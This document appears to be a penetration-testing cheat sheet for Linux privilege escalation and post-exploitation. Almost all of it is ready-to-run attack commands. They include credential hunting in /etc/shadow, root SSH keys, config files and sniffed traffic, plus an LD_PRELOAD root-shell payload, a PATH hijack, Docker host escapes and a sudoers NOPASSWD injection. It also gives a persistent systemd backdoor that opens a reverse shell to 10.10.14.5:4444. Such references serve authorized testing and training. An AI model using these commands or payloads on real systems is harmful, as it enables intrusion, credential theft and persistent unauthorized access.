# Stabilize Shell

## Stabilize shell part 1
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Stabilize shell part 2
```bash
stty raw -echo; fg; export TERM=xterm
```

# Automated Enumeration

## LinPEAS (Kali Source)
```
/usr/share/peass/linpeas/linpeas.sh
```

## LinEnum (Source)
```bash
https://github.com/rebootuser/LinEnum
```

## Linux Exploit Suggester (Source)
```
/usr/share/linux-exploit-suggester
```

## Unix-Privesc-Check (Source)
```
https://github.com/pentestmonkey/unix-privesc-check
```

## Run unix-privesc-check
```bash
unix-privesc-check standard > output.txt
```

# Manual Enumeration
## Show current user
```bash
id
```

## List system users
```bash
cat /etc/passwd
```

## Show hostname
```bash
hostname
```

## Show OS version
```bash
cat /etc/issue
cat /etc/os-release
uname -a
cat /proc/version
lsb_release -a
```

## List running processes
```bash
ps aux # | grep root
```

## pspy (Source)
```
https://github.com/DominicBreuker/pspy
```

## Watch for password processes
```bash
watch -n 1 "ps -aux | grep pass"
```

## Show network interfaces
```bash
ip a
```

## Show routing table
```bash
ip route
```

## List network connections
```bash
ss -antup
```

## Check iptables rules
```bash
ls -la /etc/iptables
iptables -L -n -v
iptables-save
```

## Capture network traffic
```bash
tcpdump -i lo -A | grep "pass"
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

## List cron files
```bash
ls -lah /etc/cron*
```

## Show system crontab
```bash
cat /etc/crontab
```

## List user cron jobs
```bash
crontab -l
```

## List all users cron jobs
```bash
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
```

## List packages Debian
```bash
dpkg -l
apt list --installed
```

## List packages RedHat
```bash
rpm -qa
yum list installed
```

## Find SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Find SGID files
```bash
find / -perm -g=s -type f 2>/dev/null
```

## Find files with capabilities
```bash
getcap -r / 2>/dev/null
```


# Credential Hunting

## grep etc for password
```
grep -rni 'password' /etc 2>/dev/null
```

## grep for private keys
```
grep -rni 'PRIVATE KEY' /home 2>/dev/null
```

## grep webroot for password
```
grep -Horn password /var/www
```

## grep etc for credentials
```
grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
```

## Find backup files
```
find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$"
```

## Find nonempty directories
```
find . -type d ! -empty
```

## Find writable directories
```bash
find / -writable -type d 2>/dev/null
```

## Show fstab
```bash
cat /etc/fstab
```

## Show mounted filesystems
```bash
mount
df -h
```

## List block devices
```bash
lsblk
```

## List kernel modules
```bash
lsmod
/sbin/modinfo <module_name>
```

## Show environment variables
```bash
echo $PATH
env
printenv
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_profile
```

## Check sudo permissions
```bash
sudo -l
```

## PATH hijacking exploit
```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

## Check for LD_PRELOAD
```bash
sudo -l | grep LD_PRELOAD
```

## LD_PRELOAD exploit
```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## Check bash history
```bash
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history
cat ~/.vim_history
find /home -name ".*history" 2>/dev/null
```

## Check sensitive files
```bash
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Check application configs
```bash
cat /var/www/html/config.php 2>/dev/null
ls -la /etc/apache2/sites-enabled/
ls -la /etc/nginx/sites-enabled/
find /opt -name "*.conf" 2>/dev/null
```

# Exploitation
## Docker escape to host
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
```

## MySQL shell escape
```bash
mysql -u root -p
\! /bin/bash
```

## Add user to sudoers
```bash
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

## Create systemd backdoor
```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service
systemctl start backdoor.service
```

---

## Methodology

### Initial Access Strategy
Always create backup shells immediately after initial access:
1. Get initial shell via web exploit
2. Immediately create second shell via different method
3. Upgrade shells and maintain multiple access points

### Enumeration Priority
1. Run automated tools first (LinPEAS, LinEnum)
2. Check sudo permissions
3. Search for SUID/SGID binaries
4. Hunt for credentials in configs and history
5. Check for writable files and directories
6. Enumerate running processes and cron jobs

### Common Privilege Escalation Vectors

**High Priority:**
- [ ] Sudo misconfigurations (NOPASSWD, wildcards, etc.)
- [ ] SUID/SGID binaries (check GTFOBins)
- [ ] Writable /etc/passwd or /etc/shadow
- [ ] Docker group membership
- [ ] Writable cron jobs or scripts

**Medium Priority:**
- [ ] PATH hijacking opportunities
- [ ] LD_PRELOAD abuse
- [ ] Capabilities on binaries
- [ ] Writable service files
- [ ] Database running as root

**Low Priority (Last Resort):**
- [ ] Kernel exploits (risk of system crash)

### GTFOBins Reference
When you find SUID binaries or sudo permissions, always check 
- https://gtfobins.github.io/#+suid
- https://gtfobins.github.io/#+sudo
- https://gtfobins.github.io/#+capabilities

### Sensitive Files Checklist
- [ ] /etc/passwd (writable?)
- [ ] /etc/shadow (readable?)
- [ ] /etc/group
- [ ] /etc/sudoers
- [ ] /etc/crontab
- [ ] /var/log/auth.log
- [ ] /var/log/secure
- [ ] /home/*/.ssh/
- [ ] /root/.ssh/
- [ ] /var/www/html/config.php
- [ ] Application configs in /opt and /usr/local

### Resources
- GTFOBins: https://gtfobins.github.io/
- HackTricks Linux PrivEsc: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- OSCP Secret Sauce (pspy process monitoring): https://eins.li/posts/oscp-secret-sauce/
